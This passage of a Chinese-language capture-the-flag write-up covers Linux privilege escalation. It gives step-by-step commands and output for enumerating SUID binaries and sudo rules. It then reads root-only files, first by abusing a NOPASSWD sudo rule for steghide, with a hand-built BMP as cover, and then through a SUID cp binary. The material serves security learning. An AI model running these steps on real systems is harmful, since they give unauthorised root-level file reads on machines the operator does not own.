find / -perm -4000 -type f 2>/dev/null
```
输出：
```
/usr/bin/chsh
/usr/bin/su
/usr/bin/umount
/usr/bin/mount
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/sudo
```
除了系统自带的 SUID 程序外，`/usr/bin/sudo` 也在列。接着检查 sudo 权限配置：
```
sudo -l
```
输出：
```
Matching Defaults entries for newuser on b25a7cb7fe0f:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User newuser may run the following commands on b25a7cb7fe0f:
    (ALL) NOPASSWD: /usr/bin/steghide
```

**关键发现：** `newuser` 可以**无密码以 root 身份**执行 `/usr/bin/steghide`！

`steghide` 是一个**隐写工具**，支持将任意文件嵌入到 JPEG / BMP / WAV / AU 格式的图片/音频中。核心用法：
```
steghide embed -cf <cover图片> -ef <要嵌入的文件> -sf <输出文件>   # 嵌入
steghide extract -sf <stego文件> -xf <输出文件>                    # 提取
```

**利用思路：** 以 root 身份运行 `steghide embed`，将 `/root/flag.txt` 嵌入到我们可控的图片中，再以普通用户身份提取出来。

先检查系统中有没有可用的图片文件：
```
find / -name "*.jpg" -o -name "*.png" -o -name "*.bmp" -o -name "*.wav" 2>/dev/null
```
输出：
```
/usr/share/pixmaps/debian-logo.png
/usr/share/icons/locolor/16x16/apps/gvim.png
/usr/share/icons/locolor/32x32/apps/gvim.png
/usr/share/icons/hicolor/48x48/apps/gvim.png
```
系统中只有 PNG 文件，但 `steghide` **不支持 PNG 格式**！而且系统没有安装 Python，无法用脚本生成图片。

**构造 BMP 文件：** 手动用 `printf` 写入 BMP 文件头 + `dd` 生成像素数据，创建一个 100×100 的有效 BMP：
```
printf '\x42\x4D\x66\x75\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00\x28\x00\x00\x00\x64\x00\x00\x00\x64\x00\x00\x00\x01\x00\x18\x00\x00\x00\x00\x00\x30\x75\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' > /tmp/c.bmp && dd if=/dev/zero bs=30000 count=1 >> /tmp/c.bmp 2>/dev/null
```
验证文件是否有效：
```
file /tmp/c.bmp
```
输出：
```
/tmp/c.bmp: PC bitmap, Windows 3.x format, 100 x 100 x 24, image size 30000, cbSize 30054, bits offset 54
```
BMP 文件创建成功！

**嵌入 flag：** 以 root 身份将 `/root/flag.txt` 嵌入到自建的 BMP 中
```
sudo /usr/bin/steghide embed -cf /tmp/c.bmp -ef /root/flag.txt -sf /tmp/out.jpg -p pass -e none -Z -N -f
```
参数说明：
- `-cf /tmp/c.bmp`：使用自建的 BMP 作为 cover
- `-ef /root/flag.txt`：将 flag 文件嵌入
- `-sf /tmp/out.jpg`：输出 stego 文件
- `-p pass`：设置密码
- `-e none`：不加密
- `-Z`：不压缩
- `-N`：不嵌入原文件名
- `-f`：强制覆盖

输出：
```
embedding "/root/flag.txt" in "/tmp/c.bmp"... done
writing stego file "/tmp/out.jpg"... done
```
嵌入成功！

**提取 flag：**
```
steghide extract -sf /tmp/out.jpg -xf /tmp/flag.txt -p pass -f
```
输出：
```
wrote extracted data to "/tmp/flag.txt".
```
读取 flag：
```
cat /tmp/flag.txt
```

**总结：** 本题的提权路径不是 SUID 文件直接读 flag，而是 `sudo` 配合 `steghide` 的**文件嵌入**功能。核心在于：`steghide embed -ef` 可以读取任何 root 可读的文件并嵌入到图片中，相当于变相的任意文件读取。当系统中没有可用的 cover 文件时，用 `printf` + `dd` 手动构造 BMP 即可。

就拿到flag啦！！！
# 35. cp提权
和前面一样，查看SUID文件
```
find / -perm -4000 -type f 2>/dev/null
```
输出
```
/usr/bin/chsh 
/usr/bin/su 
/usr/bin/umount 
/usr/bin/cp
/usr/bin/mount 
/usr/bin/chfn 
/usr/bin/newgrp 
/usr/bin/gpasswd 
/usr/bin/passwd
```
这里发现了新的SUID程序：`/usr/bin/cp`
**`cp`** 是Linux的**复制**命令。
有SUID意味着：**以root权限复制任何文件到任何位置**！
直接读取flag`/usr/bin/cp /root/flag.txt /tmp/flag.txt;cat /tmp/flag.txt`意思是把`/root/flag.txt`复制到`/tmp/flah.txt`再读取flag
就拿到flag啦！！！